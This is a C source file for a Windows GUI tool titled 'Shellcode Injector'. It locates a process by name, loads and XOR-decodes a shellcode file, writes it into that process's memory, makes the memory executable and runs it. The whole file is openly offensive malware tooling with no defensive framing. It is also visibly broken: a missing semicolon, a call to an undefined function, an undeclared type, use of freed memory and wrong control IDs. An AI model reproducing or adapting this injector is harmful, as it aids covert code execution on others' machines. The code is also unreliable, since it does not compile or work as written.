#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <stdio.h>

char* lsh(char* filename) {
    FILE* file = fopen(filename, "r");
    if (file == NULL) {
        return NULL;
    }
    fseek(file, 0, SEEK_END);
    int size = ftell(file);
    fseek(file, 0, SEEK_SET);
    char* buffer = (char*)malloc(size);
    fread(buffer, 1, size, file);
    fclose(file);
    return buffer;
}

void decodesc(char* shellcode, int size) {
    for (int i = 0; i < size; i++) {
        shellcode[i] = shellcode[i] ^ 0x41;
    }
}

DWORD pidfind(char* name) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (strcmp(pe.szExeFile, name) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

LPVOID scanmodba(DWORD pid, char* name) {
    LPVOID baseAddress = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32 me;
        me.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(hSnapshot, &me)) {
            do {
                if (strcmp(me.szModule, name) == 0) {
                    baseAddress = me.modBaseAddr;
                    break;
                }
            } while (Module32Next(hSnapshot, &me));
        }
        CloseHandle(hSnapshot);
    }
    return baseAddress;
}

LPVOID funadd(LPVOID moduleBaseAddress, char* functionName) {
    LPVOID functionAddress = NULL;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBaseAddress;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((char*)moduleBaseAddress + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((char*)moduleBaseAddress + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD addressOfFunctions = (PDWORD)((char*)moduleBaseAddress + exportDirectory->AddressOfFunctions);
    PDWORD addressOfNames = (PDWORD)((char*)moduleBaseAddress + exportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinals = (PWORD)((char*)moduleBaseAddress + exportDirectory->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* name = (char*)moduleBaseAddress + addressOfNames[i];
        if (strcmp(name, functionName) == 0) {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD address = addressOfFunctions[ordinal];
            functionAddress = (LPVOID)((char*)moduleBaseAddress + address);
            break;
        }
    }
    return functionAddress;
}

// Function to unmap module from process
BOOL unmapmod(DWORD pid, LPVOID baseAddress) {
    BOOL success = FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess != NULL) {
        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection");
        if (NtUnmapViewOfSection != NULL) {
            success = NtUnmapViewOfSection(hProcess, baseAddress) == 0;
        }
        CloseHandle(hProcess);
    }
    return success;
}

BOOL fuckmemprot(LPVOID address, SIZE_T size) {
    DWORD oldProtection;
    return VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &oldProtection);
}

void scinject(LPVOID shellcode) {
    ((void(*)())shellcode)();
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            // Create controls
            HWND hwndLabel1 = CreateWindow("STATIC", "Target Process:", WS_CHILD | WS_VISIBLE | SS_RIGHT, 10, 10, 100, 20, hwnd, NULL, NULL, NULL);
            HWND hwndEdit1 = CreateWindow("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 120, 10, 200, 20, hwnd, NULL, NULL, NULL);
            HWND hwndLabel2 = CreateWindow("STATIC", "Shellcode File:", WS_CHILD | WS_VISIBLE | SS_RIGHT, 10, 40, 100, 20, hwnd, NULL, NULL, NULL);
            HWND hwndEdit2 = CreateWindow("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 120, 40, 200, 20, hwnd, NULL, NULL, NULL);
            HWND hwndButton = CreateWindow("BUTTON", "Execute", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 120, 70, 80, 30, hwnd, NULL, NULL, NULL);
            SetFocus(hwndEdit1);
            return 0;
        }
        case WM_COMMAND: {
            if (LOWORD(wParam) == 100 && HIWORD(wParam) == BN_CLICKED) {
                char targetProcessName[256];
                GetDlgItemText(hwnd, 101, targetProcessName, sizeof(targetProcessName));
                DWORD targetProcessId = pidfind(targetProcessName);
                if (targetProcessId == 0) {
                    MessageBox(hwnd, "Target process not found.", "Error", MB_OK | MB_ICONERROR);
                    break;
                }
                // Get handle to target process
                HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
                if (hTargetProcess == NULL) {
                    MessageBox(hwnd, "Error opening target process.", "Error", MB_OK | MB_ICONERROR);
                    break;
                }
                LPVOID kernel32BaseAddress = scanmodba(targetProcessId, "kernel32.dll");
                if (kernel32BaseAddress == NULL) {
                    MessageBox(hwnd, "Error getting base address of kernel32.dll in target process.", "Error", MB_OK | MB_ICONERROR);
                    CloseHandle(hTargetProcess);
                    break;
                }
                LPVOID virtualProtectAddress = funadd(kernel32BaseAddress, "VirtualProtect");
                if (virtualProtectAddress == NULL) {
                    MessageBox(hwnd, "Error getting address of VirtualProtect function in kernel32.dll in target process.", "Error", MB_OK | MB_ICONERROR);
                    CloseHandle(hTargetProcess);
                    break;
                }
                // Unmap kernel32.dll from current process
                unmapmod(GetCurrentProcessId(), kernel32BaseAddress);
                char shellcodeFilename[256];
                GetDlgItemText(hwnd, 102, shellcodeFilename, sizeof(shellcodeFilename));
                char* encodedShellcode = lsh(shellcodeFilename);
                if (encodedShellcode == NULL) {
                    MessageBox(hwnd, "Error loading shellcode from file.", "Error", MB_OK | MB_ICONERROR);
                    CloseHandle(hTargetProcess);
                    break;
                }
                decodesc(encodedShellcode, strlen(encodedShellcode));
                LPVOID remoteShellcodeAddress = VirtualAllocEx(hTargetProcess, NULL, strlen(encodedShellcode), MEM_COMMIT, PAGE_READWRITE);
                if (remoteShellcodeAddress == NULL) {
                    MessageBox(hwnd, "Error allocating memory in target process.", "Error", MB_OK | MB_ICONERROR);
                    CloseHandle(hTargetProcess);
                    free(encodedShellcode);
                    break;
                }
                if (!WriteProcessMemory(hTargetProcess, remoteShellcodeAddress, encodedShellcode, strlen(encodedShellcode), NULL)) {
                    MessageBox(hwnd, "Error writing shellcode to memory in target process.", "Error", MB_OK | MB_ICONERROR);
                    CloseHandle(hTargetProcess);
                    free(encodedShellcode);
                    break;
                }
                free(encodedShellcode);
                if (!fuckmemprot(remoteShellcodeAddress, strlen(encodedShellcode))) {
                    MessageBox(hwnd, "Error setting memory protection.", "Error", MB_OK | MB_ICONERROR);
                    CloseHandle(hTargetProcess);
                    break
                    }
                // Execute shellcode
                sinject(remoteShellcodeAddress);
                // Clean up
                CloseHandle(hTargetProcess);
            }
            break;
        }
        case WM_CLOSE: {
            DestroyWindow(hwnd);
            return 0;
        }
        case WM_DESTROY: {
            PostQuitMessage(0);
            return 0;
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Register window class
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = "MyWindowClass";
    if (!RegisterClass(&wc)) {
        return 1;
    }
    HWND hwnd = CreateWindow("MyWindowClass", "Shellcode Injector", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 360, 140, NULL, NULL, hInstance, NULL);
    if (!hwnd) {
        return 1;
    }
    CreateWindow("STATIC", "Target Process:", WS_CHILD | WS_VISIBLE | SS_RIGHT, 10, 10, 100, 20, hwnd, (HMENU)101, NULL, NULL);
    CreateWindow("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 120, 10, 200, 20, hwnd, (HMENU)102, NULL, NULL);
    CreateWindow("STATIC", "Shellcode File:", WS_CHILD | WS_VISIBLE | SS_RIGHT, 10, 40, 100, 20, hwnd, NULL, NULL, NULL);
    CreateWindow("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 120, 40, 200, 20, hwnd, NULL, NULL, NULL);
    CreateWindow("BUTTON", "Execute", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 120, 70, 80, 30, hwnd, (HMENU)100, NULL, NULL);
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}

